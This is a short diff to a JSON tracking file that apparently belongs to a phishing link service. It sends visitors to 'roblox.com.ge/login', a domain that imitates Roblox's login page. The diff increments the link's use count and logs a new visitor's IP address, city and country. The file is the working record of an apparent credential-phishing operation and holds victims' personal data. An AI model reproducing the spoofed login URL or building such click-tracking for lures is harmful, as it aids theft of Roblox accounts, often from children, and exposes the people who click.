@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1704,
+    "useCount": 1705,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13795,6 +13795,14 @@
       },
       {
         "timestamp": 1777674900118,
+        "ip": "167.60.103.161",
+        "country": "Uruguay",
+        "city": "Montevideo",
+        "flag": "🇺🇾",
+        "countryCode": "UY"
+      },
+      {
+        "timestamp": 1777674909310,
         "ip": "167.60.103.161",
         "country": "Uruguay",
         "city": "Montevideo",
